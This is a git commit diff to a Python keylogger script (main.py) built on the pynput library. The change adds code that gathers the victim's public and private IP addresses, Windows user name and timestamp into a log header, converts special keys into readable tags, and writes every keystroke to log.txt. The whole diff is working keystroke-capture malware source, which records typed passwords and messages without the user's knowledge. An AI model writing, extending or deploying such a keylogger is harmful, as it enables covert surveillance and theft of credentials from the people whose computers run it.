2ce9da2e32e624b1f5d116a36c41362f2df8249a
James Nguyen <viethuy25@gmail.com>
2020-04-10 11:36:58 -0400

    Update readable format

--- main.py
+++ main.py
@@ -6,16 +6,46 @@ Created on Fri Apr  3 21:00:21 2020
 """
 
 import pynput
+import requests
+import socket
+import os
+import time
 
 from pynput.keyboard import Key, Listener
 
 count = 0
 keys = []
 
+publicIP = requests.get('https://api.ipify.org').text
+privateIP = socket.gethostbyname(socket.gethostname())
+user = os.path.expanduser('~').split('\\')[2]
+datetime = time.ctime(time.time())
+
+print (privateIP)
+print (user)
+print(publicIP)
+
+msg = f'\n\n[START OF LOGS]\n  *~ Date/Time: {datetime}\n  *~ User-Profile: {user}\n  *~ Public-IP: {publicIP}\n  *~ Private-IP: {privateIP}\n\n'
+keys.append(msg)
+
 def on_press(key):
     global keys, count
     
-    keys.append(key)
+    #key = str(key).strip('\'')
+    
+    substitution = ['Key.enter', ' [ENTER]\n', 'Key.backspace', ' [BACKSPACE] ', 'Key.space', ' ',
+	'Key.alt_l', ' [ALT] ', 'Key.tab', ' [TAB] ', 'Key.delete', ' [DEL] ', 'Key.ctrl_l', ' [CTRL] ', 
+	'Key.left', ' [LEFT ARROW] ', 'Key.right', ' [RIGHT ARROW] ', 'Key.shift', ' [SHIFT] ', '\\x13', 
+	' [CTRL-S] ', '\\x17', ' [CTRL-W] ', 'Key.caps_lock', ' [CAPS LK] ', '\\x01', ' [CTRL-A] ', 'Key.cmd', 
+	' [WINDOWS KEY] ', 'Key.print_screen', ' [PRNT SCR] ', '\\x03', ' [CTRL-C] ', '\\x16', ' [CTRL-V] ',
+    '\\x1a', ' [CTRL-Z] ']
+
+    key = str(key).strip('\'')
+    if key in substitution:
+        keys.append(substitution[substitution.index(key)+1])
+    else:
+        keys.append(key)
+
     count += 1
     print("{0} pressed".format(key))
     
@@ -27,7 +57,7 @@ def on_press(key):
 def write_file(keys):
     with open("log.txt", "a") as f:
         for key in keys:
-            k = str(key).replace("'", "")
+            k = str(key).replace("\'","")
             
             if k.find("space") > 0:
                 f.write('\n')
@@ -41,4 +71,3 @@ def on_release(key):
 with Listener(on_press = on_press, on_release = on_release) as listener:
     listener.join()
 
-hello, this is a funny thing to do, isn't it ?
